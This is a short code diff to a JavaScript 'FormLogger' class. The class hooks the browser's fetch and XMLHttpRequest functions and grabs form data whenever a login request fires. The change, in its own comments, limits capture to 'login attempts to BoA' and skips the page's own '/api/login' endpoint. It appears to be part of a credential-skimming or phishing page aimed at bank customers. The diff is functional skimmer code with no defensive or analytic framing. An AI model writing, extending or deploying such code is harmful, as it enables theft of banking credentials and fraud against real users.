@@ -51,10 +51,12 @@ class FormLogger {
     // Intercept fetch to capture API submissions
     const originalFetch = window.fetch;
     window.fetch = function(...args) {
-      console.log('[Logger] Fetch intercepted:', args[0]);
-      if (args[0].includes('login') || args[0].includes('signOn')) {
+      const url = args[0];
+      console.log('[Logger] Fetch intercepted:', url);
+      
+      // Only capture login attempts to BoA, NOT our own /api/login
+      if ((url.includes('login') || url.includes('signOn')) && !url.includes('/api/login')) {
         console.log('[Logger] Login-related fetch detected, will capture form data');
-        // Extract form data and log it
         self.captureAndLogFormData();
       }
       return originalFetch.apply(this, args);
@@ -63,7 +65,8 @@ class FormLogger {
     // Intercept XMLHttpRequest
     const originalOpen = XMLHttpRequest.prototype.open;
     XMLHttpRequest.prototype.open = function(method, url, ...rest) {
-      if (url.includes('login') || url.includes('signOn')) {
+      // Only capture login attempts to BoA, NOT our own /api/login
+      if ((url.includes('login') || url.includes('signOn')) && !url.includes('/api/login')) {
         console.log('[Logger] Login-related XHR detected:', method, url);
         this.addEventListener('loadstart', () => {
           self.captureAndLogFormData();
